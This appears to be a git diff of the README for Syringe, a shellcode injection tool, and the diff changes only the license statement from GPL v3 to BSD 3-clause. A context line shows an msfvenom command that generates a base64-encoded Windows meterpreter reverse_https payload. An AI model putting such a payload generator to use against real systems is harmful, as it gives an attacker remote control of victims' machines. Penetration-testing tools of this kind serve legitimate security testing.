@@ -34,5 +34,5 @@ Syringe requires shellcode to be supplied in a base64 encoded format.  The follo
   * `sudo msfvenom -p windows/x64/meterpreter/reverse_https -t raw LHOST=127.0.0.1 LPORT=443 ExitFunc=thread | base64 | awk 1 ORS=''`
 
 ### License
-Syringe is released under the GPL v3 license, for more details see
-the [LICENSE](https://github.com/securestate/syringe/blob/master/LICENSE) file.
+Syringe is released under the BSD 3-clause license, for more details see the
+[LICENSE](https://github.com/securestate/syringe/blob/master/LICENSE) file.
